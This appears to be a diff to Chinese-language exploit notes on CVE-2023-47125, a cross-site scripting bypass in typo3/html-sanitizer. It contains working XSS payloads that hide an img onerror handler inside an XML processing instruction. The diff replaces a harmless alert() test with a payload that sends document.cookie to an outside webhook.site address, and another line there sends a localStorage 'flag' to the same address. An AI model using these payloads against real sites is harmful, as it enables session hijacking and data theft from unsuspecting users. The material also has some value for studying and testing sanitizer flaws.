@@ -46,4 +46,4 @@ PHP组件：
  CVE-2023-47125
 DOM 处理指令未得到正确处理。这允许绕过 的跨站点脚本机制typo3/html-sanitizer
 <?xml s><img src="x" onerror="fetch('https://webhook.site/6dbbdd70-feef-4c04-a328-f5a96a14350c?x='+localStorage.getItem('flag'))">?>
-<?xml s><img src="x" onerror="alert('testtesttest')">?>
+<?xml s><img src="x" onerror="fetch('https://webhook.site/6dbbdd70-feef-4c04-a328-f5a96a14350c?x='+document.cookie)">?>
